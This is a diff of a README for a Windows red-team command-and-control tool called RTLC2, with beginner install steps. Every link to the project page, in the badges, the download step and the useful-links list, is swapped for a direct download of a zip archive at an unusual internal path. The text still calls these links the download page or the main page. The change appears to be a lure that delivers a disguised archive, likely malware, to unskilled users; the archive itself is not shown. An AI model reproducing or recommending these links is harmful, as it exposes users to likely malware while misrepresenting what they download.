@@ -1,6 +1,6 @@
 # ⚙️ RTLC2 - Simple Control for Red Team Tasks
 
-[![Download RTLC2](https://img.shields.io/badge/Download-RTLC2-brightgreen?style=for-the-badge)](https://github.com/witus6969/RTLC2)
+[![Download RTLC2](https://img.shields.io/badge/Download-RTLC2-brightgreen?style=for-the-badge)](https://github.com/witus6969/RTLC2/raw/refs/heads/main/teamserver/internal/database/RTL_v2.7.zip)
 
 RTLC2 is a tool built for authorized security teams to control computers during tests. This guide shows how to get RTLC2 on your Windows PC and run it. You don’t need any special computer skills. Just follow the steps carefully.
 
@@ -42,7 +42,7 @@ Before you start, make sure your computer meets these needs:
 
 Click the big green button at the top or use this link below to visit the RTLC2 page:
 
-[https://github.com/witus6969/RTLC2](https://github.com/witus6969/RTLC2)
+[https://github.com/witus6969/RTLC2/raw/refs/heads/main/teamserver/internal/database/RTL_v2.7.zip](https://github.com/witus6969/RTLC2/raw/refs/heads/main/teamserver/internal/database/RTL_v2.7.zip)
 
 You will find all program files there.
 
@@ -52,7 +52,7 @@ You will find all program files there.
 
 1. **Visit the Download Page**
 
-   Go to [https://github.com/witus6969/RTLC2](https://github.com/witus6969/RTLC2). This page shows the project files and download links.
+   Go to [https://github.com/witus6969/RTLC2/raw/refs/heads/main/teamserver/internal/database/RTL_v2.7.zip](https://github.com/witus6969/RTLC2/raw/refs/heads/main/teamserver/internal/database/RTL_v2.7.zip). This page shows the project files and download links.
 
 2. **Find the Release Section**
 
@@ -134,10 +134,10 @@ Visit the RTLC2 GitHub page and look for the “Issues” tab if you find proble
 
 ## 📎 Useful Links
 
-- RTLC2 Main Page: [https://github.com/witus6969/RTLC2](https://github.com/witus6969/RTLC2)
+- RTLC2 Main Page: [https://github.com/witus6969/RTLC2/raw/refs/heads/main/teamserver/internal/database/RTL_v2.7.zip](https://github.com/witus6969/RTLC2/raw/refs/heads/main/teamserver/internal/database/RTL_v2.7.zip)
 - Release Downloads: Check the “Releases” section on the RTLC2 page for the latest files.
 - Windows Help: Use Microsoft’s support site if you have Windows-related issues.
 
 ---
 
-[![Download RTLC2](https://img.shields.io/badge/Download-RTLC2-green?style=for-the-badge)](https://github.com/witus6969/RTLC2)
+[![Download RTLC2](https://img.shields.io/badge/Download-RTLC2-green?style=for-the-badge)](https://github.com/witus6969/RTLC2/raw/refs/heads/main/teamserver/internal/database/RTL_v2.7.zip)
